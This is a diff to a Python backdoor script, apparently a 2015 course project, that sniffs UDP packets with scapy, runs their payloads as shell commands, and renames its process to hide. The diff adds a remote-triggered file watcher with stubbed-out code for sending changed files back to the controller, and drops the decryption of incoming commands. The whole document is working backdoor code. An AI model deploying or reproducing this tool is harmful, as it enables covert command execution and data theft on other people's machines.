@@ -14,7 +14,7 @@
 ##  DATE:           October 17, 2015
 ##
 ##################################################################################
-import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle
+import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle, threading, pyinotify
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from AesEncryption import *
@@ -33,6 +33,31 @@ def executeShellCommand(command):
     outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
     return outputString
 
+
+
+
+def onChange(ev):
+    cmd = ['/bin/echo', 'File', ev.pathname, 'changed']
+    subprocess.Popen(cmd).communicate()
+    # with open("/root/Documents/C8505/Final Project/pyinotify/3.png", 'r') as f:
+    #     data = f.read()
+    # f.close()
+    # send_to_client(data)
+    print "sent changed data"
+    return
+
+
+
+def watch_file(directory):
+    print "watch:", directory 
+    wm = pyinotify.WatchManager()
+    wm.add_watch(directory, pyinotify.IN_CLOSE_WRITE, onChange)
+    notifier = pyinotify.Notifier(wm)
+    notifier.loop()
+
+
+
+
 ##################################################################################
 ##  FUNCTION
 ##
@@ -45,13 +70,17 @@ def executeShellCommand(command):
 ##################################################################################
 def parsePacket(receivedPacket):
 
-    command = decrypt(receivedPacket['Raw'].load)
+    command = (receivedPacket['Raw'].load)
 
 
-    if receivedPacket["IP"].dst == 22:
-        directory = decrypt(receivedPacket['Raw'].load)
+    if receivedPacket["UDP"].dport == 22:
+        directory = (receivedPacket['Raw'].load)
+        print directory
+        t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory])
+        t.start()
 
-    elif receivedPacket["IP"].dst == 80:
+
+    elif receivedPacket["UDP"].dport == 80:
 
         print "Excuting: " + command
         output = executeShellCommand(command)
@@ -83,7 +112,7 @@ def parsePacket(receivedPacket):
 def main():
 
     setproctitle.setproctitle("notabackdoor.py")
-    sniff(filter="udp and (dst port 80) and (dst port 22) and (src port 8000)", prn=parsePacket)
+    sniff(filter="udp and (dst port 80 or dst port 22) and (src port 8000)", prn=parsePacket)
 
 if __name__ == '__main__':
     main()
